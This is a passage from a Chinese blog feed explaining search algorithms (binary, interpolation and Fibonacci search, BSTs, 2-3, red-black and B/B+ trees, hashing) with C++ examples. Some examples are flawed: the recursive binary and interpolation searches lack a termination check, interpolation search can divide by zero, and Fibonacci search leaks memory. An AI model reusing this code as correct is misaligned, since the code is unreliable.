class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二分查找（折半查找），版本1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinarySearch1</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> value, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> low, high, mid;</span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high)</span><br><span class="line">    &#123;</span><br><span class="line">        mid = (low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]==value)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&gt;value)</span><br><span class="line">            high = mid<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&lt;value)</span><br><span class="line">            low = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二分查找，递归版本</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinarySearch2</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> value, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = low+(high-low)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(a[mid]==value)</span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    <span class="keyword">if</span>(a[mid]&gt;value)</span><br><span class="line">        <span class="keyword">return</span> BinarySearch2(a, value, low, mid<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(a[mid]&lt;value)</span><br><span class="line">        <span class="keyword">return</span> BinarySearch2(a, value, mid+<span class="number">1</span>, high);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插值查找"><a href="#插值查找" class="headerlink" title="插值查找"></a>插值查找</h3><p>在介绍插值查找之前，首先考虑一个新问题，为什么上述算法一定要是折半，而不是折四分之一或者折更多呢？</p><p>打个比方，在英文字典里面查“apple”，你下意识翻开字典是翻前面的书页还是后面的书页呢？如果再让你查“zoo”，你又怎么查？很显然，这里你绝对不会是从中间开始查起，而是有一定目的的往前或往后翻。</p><p>同样的，比如要在取值范围1 ~ 10000 之间 100 个元素从小到大均匀分布的数组中查找5， 我们自然会考虑从数组下标较小的开始查找。</p><p>经过以上分析，折半查找这种查找方式，不是自适应的（也就是说是傻瓜式的）。二分查找中查找点计算如下：</p><p>　　mid=(low+high)/2, 即mid=low+1/2*(high-low);</p><p>通过类比，我们可以将查找的点改进为如下：</p><p>　　mid=low+(key-a[low])/(a[high]-a[low])*(high-low)，</p><p>也就是将上述的比例参数1/2改进为自适应的，根据关键字在整个有序表中所处的位置，让mid值的变化更靠近关键字key，这样也就间接地减少了比较次数。</p><p><strong>基本思想：</strong>基于二分查找算法，将查找点的选择改进为自适应选择，可以提高查找效率。当然，差值查找也属于有序查找。</p><p>注：<strong>对于表长较大，而关键字分布又比较均匀的查找表来说，插值查找算法的平均性能比折半查找要好的多。反之，数组中如果分布非常不均匀，那么插值查找未必是很合适的选择。</strong></p><p><strong>复杂度分析：查找成功或者失败的时间复杂度均为O(log2(log2n))。</strong></p><p><strong>C++实现源码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插值查找</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InsertionSearch</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> value, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = low+(value-a[low])/(a[high]-a[low])*(high-low);</span><br><span class="line">    <span class="keyword">if</span>(a[mid]==value)</span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    <span class="keyword">if</span>(a[mid]&gt;value)</span><br><span class="line">        <span class="keyword">return</span> InsertionSearch(a, value, low, mid<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(a[mid]&lt;value)</span><br><span class="line">        <span class="keyword">return</span> InsertionSearch(a, value, mid+<span class="number">1</span>, high);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="斐波那契查找"><a href="#斐波那契查找" class="headerlink" title="斐波那契查找"></a>斐波那契查找</h3><p>在介绍斐波那契查找算法之前，我们先介绍一下很它紧密相连并且大家都熟知的一个概念——黄金分割。</p><p>黄金比例又称黄金分割，是指事物各部分间一定的数学比例关系，即将整体一分为二，较大部分与较小部分之比等于整体与较大部分之比，其比值约为1:0.618或1.618:1。</p><p>0.618被公认为最具有审美意义的比例数字，这个数值的作用不仅仅体现在诸如绘画、雕塑、音乐、建筑等艺术领域，而且在管理、工程设计等方面也有着不可忽视的作用。因此被称为黄金分割。</p><p>大家记不记得斐波那契数列：1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89…….（从第三个数开始，后边每一个数都是前两个数的和）。然后我们会发现，随着斐波那契数列的递增，前后两个数的比值会越来越接近0.618，利用这个特性，我们就可以将黄金比例运用到查找技术中。</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic1.jpeg"><p><strong>基本思想：</strong>也是二分查找的一种提升算法，通过运用黄金比例的概念在数列中选择查找点进行查找，提高查找效率。同样地，斐波那契查找也属于一种有序查找算法。</p><p>相对于折半查找，一般将待比较的key值与第mid=（low+high）/2位置的元素比较，比较结果分三种情况：</p><ol><li>相等，mid位置的元素即为所求</li><li>&gt;，low=mid+1;</li><li>&lt;，high=mid-1。</li></ol><p>斐波那契查找与折半查找很相似，他是根据斐波那契序列的特点对有序表进行分割的。他要求开始表中记录的个数为某个斐波那契数小1，及n=F(k)-1;</p><p>开始将k值与第F(k-1)位置的记录进行比较(及mid=low+F(k-1)-1),比较结果也分为三种</p><ol><li>相等，mid位置的元素即为所求</li><li>&gt;，low=mid+1,k-=2;<br>说明：low=mid+1说明待查找的元素在[mid+1,high]范围内，k-=2 说明范围[mid+1,high]内的元素个数为n-(F(k-1))= Fk-1-F(k-1)=Fk-F(k-1)-1=F(k-2)-1个，所以可以递归的应用斐波那契查找。</li><li>&lt;，high=mid-1,k-=1。<br>说明：low=mid+1说明待查找的元素在[low,mid-1]范围内，k-=1 说明范围[low,mid-1]内的元素个数为F(k-1)-1个，所以可以递归 的应用斐波那契查找。</li></ol><p><strong>复杂度分析：最坏情况下，时间复杂度为O(log2n)，且其期望复杂度也为O(log2n**</strong>)。**</p><p><strong>C++实现源码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 斐波那契查找.cpp </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> max_size=<span class="number">20</span>;<span class="comment">//斐波那契数组的长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*构造一个斐波那契数组*/</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Fibonacci</span><span class="params">(<span class="keyword">int</span> * F)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    F[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    F[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;max_size;++i)</span><br><span class="line">        F[i]=F[i<span class="number">-1</span>]+F[i<span class="number">-2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*定义斐波那契查找法*/</span>  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FibonacciSearch</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> n, <span class="keyword">int</span> key)</span>  <span class="comment">//a为要查找的数组,n为要查找的数组长度,key为要查找的关键字</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> low=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> high=n<span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> F[max_size];</span><br><span class="line">  Fibonacci(F);<span class="comment">//构造一个斐波那契数组F </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(n&gt;F[k]<span class="number">-1</span>)<span class="comment">//计算n位于斐波那契数列的位置</span></span><br><span class="line">      ++k;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span>  * temp;<span class="comment">//将数组a扩展到F[k]-1的长度</span></span><br><span class="line">  temp=<span class="keyword">new</span> <span class="keyword">int</span> [F[k]<span class="number">-1</span>];</span><br><span class="line">  <span class="built_in">memcpy</span>(temp,a,n*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&lt;F[k]<span class="number">-1</span>;++i)</span><br><span class="line">     temp[i]=a[n<span class="number">-1</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span>(low&lt;=high)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> mid=low+F[k<span class="number">-1</span>]<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(key&lt;temp[mid])</span><br><span class="line">    &#123;</span><br><span class="line">      high=mid<span class="number">-1</span>;</span><br><span class="line">      k-=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&gt;temp[mid])</span><br><span class="line">    &#123;</span><br><span class="line">     low=mid+<span class="number">1</span>;</span><br><span class="line">     k-=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span>(mid&lt;n)</span><br><span class="line">           <span class="keyword">return</span> mid; <span class="comment">//若相等则说明mid即为查找到的位置</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           <span class="keyword">return</span> n<span class="number">-1</span>; <span class="comment">//若mid&gt;=n则说明是扩展的数值,返回n-1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">delete</span> [] temp;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[] = &#123;<span class="number">0</span>,<span class="number">16</span>,<span class="number">24</span>,<span class="number">35</span>,<span class="number">47</span>,<span class="number">59</span>,<span class="number">62</span>,<span class="number">73</span>,<span class="number">88</span>,<span class="number">99</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> key=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> index=FibonacciSearch(a,<span class="keyword">sizeof</span>(a)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>),key);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;key&lt;&lt;<span class="string">" is located at:"</span>&lt;&lt;index;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数表查找"><a href="#数表查找" class="headerlink" title="数表查找"></a>数表查找</h3><h4 id="最简单的树表查找算法——二叉树查找算法"><a href="#最简单的树表查找算法——二叉树查找算法" class="headerlink" title="最简单的树表查找算法——二叉树查找算法"></a>最简单的树表查找算法——二叉树查找算法</h4><p><strong>基本思想：</strong>二叉查找树是先对待查找的数据进行生成树，确保树的左分支的值小于右分支的值，然后在就行和每个节点的父节点比较大小，查找最适合的范围。 这个算法的查找效率很高，但是如果使用这种查找方法要首先创建树。 </p><p><strong>二叉查找树</strong>（BinarySearch Tree，也叫二叉搜索树，或称二叉排序树Binary Sort Tree）或者是一棵空树，或者是具有下列性质的二叉树：</p><ol><li>若任意节点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li><li>若任意节点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</li><li>任意节点的左、右子树也分别为二叉查找树。</li></ol><p><strong>二叉查找树性质</strong>：<strong>对二叉查找树进行中序遍历，即可得到有序的数列。</strong></p><p>有关二叉查找树的查找、插入、删除等操作的详细讲解，请移步<a href="http://www.cnblogs.com/yangecnu/p/Introduce-Binary-Search-Tree.html" target="_blank" rel="noopener">浅谈算法和数据结构: 七 二叉查找树</a>。</p><p><strong>复杂度分析：它和二分查找一样，插入和查找的时间复杂度均为O(logn)，但是在最坏的情况下仍然会有O(n)的时间复杂度。原因在于插入和删除元素的时候，树没有保持平衡（比如，我们查找上图（b）中的“93”，我们需要进行n次查找操作）。我们追求的是在最坏的情况下仍然有较好的时间复杂度，这就是平衡查找树设计的初衷。</strong></p><p>下图为二叉树查找和顺序查找以及二分查找性能的对比图：</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic2.png"><p>基于二叉查找树进行优化，进而可以得到其他的树表查找算法，如平衡树、红黑树等高效算法。</p><h4 id="平衡查找树之2-3查找树（2-3-Tree）"><a href="#平衡查找树之2-3查找树（2-3-Tree）" class="headerlink" title="平衡查找树之2-3查找树（2-3 Tree）"></a>平衡查找树之2-3查找树（2-3 Tree）</h4><p><strong>2-3查找树定义</strong>：和二叉树不一样，2-3树运行每个节点保存1个或者两个的值。对于普通的2节点(2-node)，他保存1个key和左右两个自己点。对应3节点(3-node)，保存两个Key，2-3查找树的定义如下：</p><ol><li>要么为空，要么：</li><li>对于2节点，该节点保存一个key及对应value，以及两个指向左右节点的节点，左节点也是一个2-3节点，所有的值都比key要小，右节点也是一个2-3节点，所有的值比key要大。</li><li>对于3节点，该节点保存两个key及对应value，以及三个指向左中右的节点。左节点也是一个2-3节点，所有的值均比两个key中的最小的key还要小；中间节点也是一个2-3节点，中间节点的key值在两个跟节点key值之间；右节点也是一个2-3节点，节点的所有key值比两个key中的最大的key还要大。</li></ol><img src="/2018/07/20/2018-07-20-七大查找算法/pic3.png"><p><strong>2-3查找树的性质：</strong></p><ol><li><p>如果中序遍历2-3查找树，就可以得到排好序的序列；</p></li><li><p>在一个完全平衡的2-3查找树中，根节点到每一个为空节点的距离都相同。（这也是平衡树中“平衡”一词的概念，根节点到叶节点的最长距离对应于查找算法的最坏情况，而平衡树中根节点到叶节点的距离都一样，最坏情况也具有对数复杂度。）</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic4.png"></li></ol><p><strong>复杂度分析：</strong></p><p>2-3树的查找效率与树的高度是息息相关的。</p><ul><li>在最坏的情况下，也就是所有的节点都是2-node节点，查找效率为lgN</li><li>在最好的情况下，所有的节点都是3-node节点，查找效率为log3N约等于0.631lgN</li></ul><p>距离来说，对于1百万个节点的2-3树，树的高度为12-20之间，对于10亿个节点的2-3树，树的高度为18-30之间。</p><p>对于插入来说，只需要常数次操作即可完成，因为他只需要修改与该节点关联的节点即可，不需要检查其他节点，所以效率和查找类似。下面是2-3查找树的效率：</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic5.png"><h4 id="平衡查找树之红黑树（Red-Black-Tree）"><a href="#平衡查找树之红黑树（Red-Black-Tree）" class="headerlink" title="平衡查找树之红黑树（Red-Black Tree）"></a>平衡查找树之红黑树（Red-Black Tree）</h4><p>2-3查找树能保证在插入元素之后能保持树的平衡状态，最坏情况下即所有的子节点都是2-node，树的高度为lgn，从而保证了最坏情况下的时间复杂度。但是2-3树实现起来比较复杂，于是就有了一种简单实现2-3树的数据结构，即红黑树（Red-Black Tree）。</p><p><strong>基本思想：</strong>红黑树的思想就是对2-3查找树进行编码，尤其是对2-3查找树中的3-nodes节点添加额外的信息。红黑树中将节点之间的链接分为两种不同类型，红色链接，他用来链接两个2-nodes节点来表示一个3-nodes节点。黑色链接用来链接普通的2-3节点。特别的，使用红色链接的两个2-nodes来表示一个3-nodes节点，并且向左倾斜，即一个2-node是另一个2-node的左子节点。这种做法的好处是查找的时候不用做任何修改，和普通的二叉查找树相同。</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic6.png"><p><strong>红黑树的定义：</strong></p><p>红黑树是一种具有红色和黑色链接的平衡查找树，同时满足：</p><ul><li>红色节点向左倾斜</li><li>一个节点不可能有两个红色链接</li><li>整个树完全黑色平衡，即从根节点到所以叶子结点的路径上，黑色链接的个数都相同。</li></ul><p>下图可以看到红黑树其实是2-3树的另外一种表现形式：如果我们将红色的连线水平绘制，那么他链接的两个2-node节点就是2-3树中的一个3-node节点了。</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic7.png"><p><strong>红黑树的性质</strong>：<strong>整个树完全黑色平衡，即从根节点到所以叶子结点的路径上，黑色链接的个数都相同（2-3树的第2）性质，从根节点到叶子节点的距离都相等）。</strong></p><p><strong>复杂度分析：最坏的情况就是，红黑树中除了最左侧路径全部是由3-node节点组成，即红黑相间的路径长度是全黑路径长度的2倍。</strong></p><p>下图是一个典型的红黑树，从中可以看到最长的路径(红黑相间的路径)是最短路径的2倍：</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic8.png"><p><strong>红黑树的平均高度大约为logn。</strong></p><p>下图是红黑树在各种情况下的时间复杂度，可以看出红黑树是2-3查找树的一种实现，它能保证最坏情况下仍然具有对数的时间复杂度。</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic9.png"><p>红黑树这种数据结构应用十分广泛，在多种编程语言中被用作符号表的实现，如：</p><ul><li>Java中的java.util.TreeMap,java.util.TreeSet；</li><li>C++ STL中的：map,multimap,multiset；</li><li>.NET中的：SortedDictionary,SortedSet 等。</li></ul><h4 id="B树和B-树（B-Tree-B-Tree）"><a href="#B树和B-树（B-Tree-B-Tree）" class="headerlink" title="B树和B+树（B Tree/B+ Tree）"></a>B树和B+树（B Tree/B+ Tree）</h4><p>平衡查找树中的2-3树以及其实现红黑树。2-3树种，一个节点最多有2个key，而红黑树则使用染色的方式来标识这两个key。</p><p>维基百科对B树的定义为“在计算机科学中，B树（B-tree）是一种树状数据结构，它能够存储数据、对其进行排序并允许以O(log n)的时间复杂度运行进行查找、顺序读取、插入和删除的数据结构。B树，概括来说是一个节点可以拥有多于2个子节点的二叉查找树。与自平衡二叉查找树不同，B树为系统最优化<strong>大块数据的读和写操作</strong>。B-tree算法减少定位记录时所经历的中间过程，从而加快存取速度。普遍运用在<strong>数据库</strong>和<strong>文件系统</strong>。</p><h5 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h5><p><strong>B树定义：</strong></p><p><strong>B树</strong>可以看作是对2-3查找树的一种扩展，即他允许每个节点有M-1个子节点。</p><ul><li>根节点至少有两个子节点</li><li>每个节点有M-1个key，并且以升序排列</li><li>位于M-1和M key的子节点的值位于M-1 和M key对应的Value之间</li><li>其它节点至少有M/2个子节点</li></ul><p>下图是一个M=4 阶的B树:</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic10.png"><p>可以看到B树是2-3树的一种扩展，他允许一个节点有多于2个的元素。B树的插入及平衡化操作和2-3树很相似，这里就不介绍了。下面是往B树中依次插入</p><p><strong>6 10 4 14 5 11 15 3 2 12 1 7 8 8 6 3 6 21 5 15 15 6 32 23 45 65 7 8 6 5 4</strong></p><p>的演示动画：</p><h5 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h5><h5 id="B-树定义："><a href="#B-树定义：" class="headerlink" title="B+树定义："></a><strong>B+树定义：</strong></h5><p><strong>B+</strong>树是对B树的一种变形树，它与B树的差异在于：</p><ul><li>有k个子结点的结点必然有k个关键码；</li><li>非叶结点仅具有索引作用，跟记录有关的信息均存放在叶结点中。</li><li>树的所有叶结点构成一个有序链表，可以按照关键码排序的次序遍历全部记录。</li></ul><p>如下图，是一个B+树:</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic12.png"><p>下图是B+树的插入动画：</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic13.gif"><h5 id="B树和B-树的区别"><a href="#B树和B-树的区别" class="headerlink" title="B树和B+树的区别"></a>B树和B+树的区别</h5><p><strong>B和B+树的区别在于，B+树的非叶子结点只包含导航信息，不包含实际的值，所有的叶子结点和相连的节点使用链表相连，便于区间查找和遍历。</strong></p><p>B+ 树的优点在于：</p><ul><li>由于B+树在内部节点上不好含数据信息，因此在内存页中能够存放更多的key。 数据存放的更加紧密，具有更好的空间局部性。因此访问叶子几点上关联的数据也具有更好的缓存命中率。</li><li>B+树的叶子结点都是相链的，因此对整棵树的便利只需要一次线性遍历叶子结点即可。而且由于数据顺序排列并且相连，所以便于区间查找和搜索。而B树则需要进行每一层的递归遍历。相邻的元素可能在内存中不相邻，所以缓存命中性没有B+树好。</li></ul><p><strong>但是B树也有优点，其优点在于，由于B树的每一个节点都包含key和value，因此经常访问的元素可能离根节点更近，因此访问也更迅速。</strong></p><p>下面是B 树和B+树的区别图：</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic14.png"><p>B/B+树常用于文件系统和数据库系统中，它通过对每个节点存储个数的扩展，使得对连续的数据能够进行较快的定位和访问，能够有效减少查找时间，提高存储的空间局部性从而减少IO操作。它广泛用于文件系统及数据库中，如：</p><ul><li>Windows：HPFS文件系统；</li><li>Mac：HFS，HFS+文件系统；</li><li>Linux：ResiserFS，XFS，Ext3FS，JFS文件系统；</li><li>数据库：ORACLE，MYSQL，SQLSERVER等中。</li></ul><p>有关B/B+树在数据库索引中的应用，请看<a href="/2018/08/16/索引背后的数据结构与算法/">MySQL索引背后的数据结构及算法原理</a>这篇文章。</p><h4 id="树表查找总结"><a href="#树表查找总结" class="headerlink" title="树表查找总结"></a>树表查找总结</h4><p>二叉查找树平均查找性能不错，为O(logn)，但是最坏情况会退化为O(n)。在二叉查找树的基础上进行优化，我们可以使用平衡查找树。平衡查找树中的2-3查找树，这种数据结构在插入之后能够进行自平衡操作，从而保证了树的高度在一定的范围内进而能够保证最坏情况下的时间复杂度。但是2-3查找树实现起来比较困难，红黑树是2-3树的一种简单高效的实现，他巧妙地使用颜色标记来替代2-3树中比较难处理的3-node节点问题。红黑树是一种比较高效的平衡查找树，应用非常广泛，很多编程语言的内部实现都或多或少的采用了红黑树。</p><p>除此之外，2-3查找树的另一个扩展——B/B+平衡树，在文件系统和数据库系统中有着广泛的应用。</p><h3 id="分块查找"><a href="#分块查找" class="headerlink" title="分块查找"></a>分块查找</h3><p>分块查找又称索引顺序查找，它是顺序查找的一种改进方法。</p><p><strong>算法思想：</strong>将n个数据元素”按块有序”划分为m块（m ≤ n）。每一块中的结点不必有序，但块与块之间必须”按块有序”；即第1块中任一元素的关键字都必须小于第2块中任一元素的关键字；而第2块中任一元素又都必须小于第3块中的任一元素，……</p><p><strong>算法流程：</strong></p><ul><li>step1 先选取各块中的最大关键字构成一个索引表；</li><li>step2 查找分两个部分：先对索引表进行二分查找或顺序查找，以确定待查记录在哪一块中；然后，在已确定的块中用顺序法进行查找。</li></ul><h3 id="哈希查询"><a href="#哈希查询" class="headerlink" title="哈希查询"></a>哈希查询</h3><p><strong>什么是哈希表（Hash）？</strong></p><p>我们使用一个下标范围比较大的数组来存储元素。可以设计一个函数（哈希函数， 也叫做散列函数），使得每个元素的关键字都与一个函数值（即数组下标）相对应，于是用这个数组单元来存储这个元素；也可以简单的理解为，按照关键字为每一个元素”分类”，然后将这个元素存储在相应”类”所对应的地方。但是，不能够保证每个元素的关键字与函数值是一一对应的，因此极有可能出现对于不同的元素，却计算出了相同的函数值，这样就产生了”冲突”，换句话说，就是把不同的元素分在了相同的”类”之中。后面我们将看到一种解决”冲突”的简便做法。</p><p><strong>总的来说，”直接定址”与”解决冲突”是哈希表的两大特点。</strong></p><p><strong>什么是哈希函数？</strong></p><p>哈希函数的规则是：通过某种转换关系，使关键字适度的分散到指定大小的的顺序结构中，越分散，则以后查找的时间复杂度越小，空间复杂度越高。</p><p><strong>算法思想：</strong>哈希的思路很简单，如果所有的键都是整数，那么就可以使用一个简单的无序数组来实现：将键作为索引，值即为其对应的值，这样就可以快速访问任意键的值。这是对于简单的键的情况，我们将其扩展到可以处理更加复杂的类型的键。</p><p><strong>算法流程：</strong></p><ul><li>用给定的哈希函数构造哈希表；</li><li>根据选择的冲突处理方法解决地址冲突；<br>常见的解决冲突的方法：拉链法和线性探测法。详细的介绍可以参见：<a href="http://www.cnblogs.com/yangecnu/p/Introduce-Hashtable.html" target="_blank" rel="noopener">浅谈算法和数据结构: 十一 哈希表</a>。</li><li>在哈希表的基础上执行哈希查找。</li></ul><p><strong>哈希表是一个在时间和空间上做出权衡的经典例子。如果没有内存限制，那么可以直接将键作为数组的索引。那么所有的查找时间复杂度为O(1)；如果没有时间限制，那么我们可以使用无序数组并进行顺序查找，这样只需要很少的内存。哈希表使用了适度的时间和空间来在这两个极端之间找到了平衡。只需要调整哈希函数算法即可在时间和空间上做出取舍。</strong></p><p><strong>复杂度分析</strong>：</p><p>单纯论查找复杂度：对于无冲突的Hash表而言，查找复杂度为O(1)（注意，在查找之前我们需要构建相应的Hash表）。</p><p><strong>使用Hash，我们付出了什么？</strong><br>我们在实际编程中存储一个大规模的数据，最先想到的存储结构可能就是map，也就是我们常说的KV pair，经常使用Python的博友可能更有这种体会。使用map的好处就是，我们在后续处理数据处理时，可以根据数据的key快速的查找到对应的value值。map的本质就是Hash表，那我们在获取了超高查找效率的基础上，我们付出了什么？</p><p>Hash是一种典型<strong>以空间换时间</strong>的算法，比如原来一个长度为100的数组，对其查找，只需要遍历且匹配相应记录即可，从空间复杂度上来看，假如数组存储的是byte类型数据，那么该数组占用100byte空间。现在我们采用Hash算法，我们前面说的Hash必须有一个规则，约束键与存储位置的关系，那么就需要一个固定长度的hash表，此时，仍然是100byte的数组，假设我们需要的100byte用来记录键与位置的关系，那么总的空间为200byte,而且用于记录规则的表大小会根据规则，大小可能是不定的。</p><p>Hash算法和其他查找算法的性能对比：</p><img src="/2018/07/20/2018-07-20-七大查找算法/pic15.png">]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP状态码</title>
      <link href="/2018/07/09/2018-07-09-HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"/>
      <url>/2018/07/09/2018-07-09-HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</url>
      
